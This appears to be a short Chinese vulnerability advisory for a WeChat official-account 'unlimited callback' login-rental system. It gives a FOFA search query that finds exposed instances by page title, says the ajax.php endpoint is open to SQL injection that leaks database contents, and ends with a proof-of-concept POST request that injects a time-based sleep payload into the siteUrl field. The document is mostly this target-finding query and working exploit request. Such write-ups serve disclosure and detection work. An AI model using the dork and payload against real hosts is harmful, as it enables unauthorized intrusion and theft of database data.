**fofa**

```
title=="公众号无限回调系统"
```

**一、漏洞简述**

微信公众平台回调系统是公众号登录接口租用/出售管理系统，适用场景：H5游戏，H5网站，适用于一切需要公众号登录接口的H5网站。其接口ajax.php存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

**二、漏洞检测poc**

```yaml
POST /user/ajax.php?act=siteadd HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 27

siteUrl=';select sleep(5)#'
```

